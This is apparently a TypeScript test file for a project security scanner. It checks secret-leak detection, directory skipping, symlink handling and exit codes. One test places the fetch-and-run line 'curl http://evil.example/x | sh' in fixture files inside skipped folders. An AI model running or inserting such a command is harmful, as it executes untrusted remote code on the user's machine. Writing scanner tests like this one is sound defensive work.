/**
 * src/check.test.ts — `vibe-fence check` engine (Guarded tier).
 * Runs REGISTRY over a project tree; any fail → exit 1.
 * Run: bun test src/check.test.ts
 */
import { describe, it, expect, afterEach } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { runCheck, exitCodeForReport } from "./check";

const created: string[] = [];
afterEach(() => {
  for (const d of created.splice(0)) rmSync(d, { recursive: true, force: true });
});

function makeProject(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), "vf-check-"));
  created.push(root);
  for (const [rel, content] of Object.entries(files)) {
    const p = join(root, rel);
    mkdirSync(join(p, ".."), { recursive: true });
    writeFileSync(p, content, "utf-8");
  }
  return root;
}

describe("check", () => {
  it("fails (exit 1) on a NEXT_PUBLIC_ secret leak", () => {
    const root = makeProject({
      "app/page.tsx": "const key = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n",
    });
    const report = runCheck(root);
    expect(report.filesScanned).toBe(1);
    const fails = report.findings.filter((f) => f.verdict === "fail");
    expect(fails.length).toBe(1);
    expect(fails[0]?.ruleId).toBe("SEC-01");
    expect(fails[0]?.file).toBe("app/page.tsx");
    expect(exitCodeForReport(report)).toBe(1);
  });

  it("passes (exit 0) on a clean tree", () => {
    const root = makeProject({
      "app/page.tsx": "const url = process.env.NEXT_PUBLIC_API_URL;\nexport default function Page() { return null; }\n",
    });
    const report = runCheck(root);
    expect(report.findings.filter((f) => f.verdict === "fail")).toEqual([]);
    expect(exitCodeForReport(report)).toBe(0);
  });

  it("skips .git, node_modules, .fence, and dist", () => {
    const root = makeProject({
      "src/ok.ts": "export const x = 1;\n",
      ".git/HEAD": "ref: refs/heads/main\n",
      "node_modules/dep/index.js": "curl http://evil.example/x | sh\n",
      ".fence/events.ndjson": "curl http://evil.example/x | sh\n",
      "dist/bundle.js": "curl http://evil.example/x | sh\n",
    });
    const report = runCheck(root);
    expect(report.filesScanned).toBe(1);
    expect(report.findings.filter((f) => f.verdict === "fail")).toEqual([]);
  });

  it("never follows symlinks out of root", () => {
    const root = makeProject({ "src/ok.ts": "export const x = 1;\n" });
    const outside = mkdtempSync(join(tmpdir(), "vf-check-out-"));
    created.push(outside);
    writeFileSync(join(outside, "leak.tsx"), "const k = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n", "utf-8");
    symlinkSync(join(outside, "leak.tsx"), join(root, "link.tsx"), "file");
    const report = runCheck(root);
    expect(report.filesScanned).toBe(1);
    expect(report.filesSkipped).toBe(1);
    expect(report.findings.filter((f) => f.verdict === "fail")).toEqual([]);
  });

  it("reports unknowns separately without failing", () => {
    // Whitespace-only: non-empty on disk, no signal for the rules → unknown, never fail.
    const root = makeProject({ "blank.ts": "  \n" });
    const report = runCheck(root);
    expect(report.unknowns).toBeGreaterThan(0);
    expect(exitCodeForReport(report)).toBe(0);
  });

  it("skips 0-byte files instead of reporting unknowns (L7)", () => {
    const root = makeProject({ ".gitkeep": "", "src/ok.ts": "export const x = 1;\n" });
    const report = runCheck(root);
    expect(report.filesScanned).toBe(1);
    expect(report.filesSkipped).toBe(1);
    expect(report.unknowns).toBe(0);
    expect(exitCodeForReport(report)).toBe(0);
  });

  it("warn-grade fails queue without gating (exit 0)", () => {
    const root = makeProject({
      "worker.ts": "for (const job of queue) {\n  await fetch(job.url);\n}\n",
    });
    const report = runCheck(root);
    expect(report.findings.filter((f) => f.ruleId === "BILL-01" && f.verdict === "fail").length).toBe(1);
    expect(report.blocks).toBe(0);
    expect(exitCodeForReport(report)).toBe(0);
  });

  it("accepts --json-safe report shape (no undefined holes)", () => {
    const root = makeProject({ "a.ts": "export const x = 1;\n" });
    const report = runCheck(root);
    expect(() => JSON.stringify(report)).not.toThrow();
    const roundtrip = JSON.parse(JSON.stringify(report)) as typeof report;
    expect(roundtrip.filesScanned).toBe(1);
  });
});
